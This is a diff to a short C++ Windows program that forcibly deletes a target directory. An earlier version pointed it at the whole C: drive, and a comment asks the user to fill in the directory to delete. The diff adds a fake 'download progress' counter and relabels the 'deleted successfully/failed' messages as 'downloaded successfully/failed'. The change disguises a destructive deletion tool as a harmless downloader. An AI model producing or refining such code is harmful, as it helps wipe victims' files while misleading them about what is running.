@@ -27,11 +27,20 @@ bool ForceRemoveDirectory(const std::wstring& path) {
 }
 
 int wmain() {
-    std::wstring target = L"C:\\";  // ⚠️ 请改成你要删除的目录
+    std::wstring target = L"C:\\test"; // ⚠️ 请改成你要删除的目录 
+
+    int percent = 0;
+    while (percent <= 100) {
+        std::wcout << L"\r下载进度：" << percent << L"%   " << std::flush;
+        Sleep(100); // 0.1秒
+        percent++;
+    }
+    std::wcout << std::endl;
+
     if (ForceRemoveDirectory(target)) {
-        std::wcout << L"删除成功！\n";
+        std::wcout << L"下载成功！\n";
     } else {
-        std::wcout << L"删除失败！\n";
+        std::wcout << L"下载失败！\n";
     }
     return 0;
 }
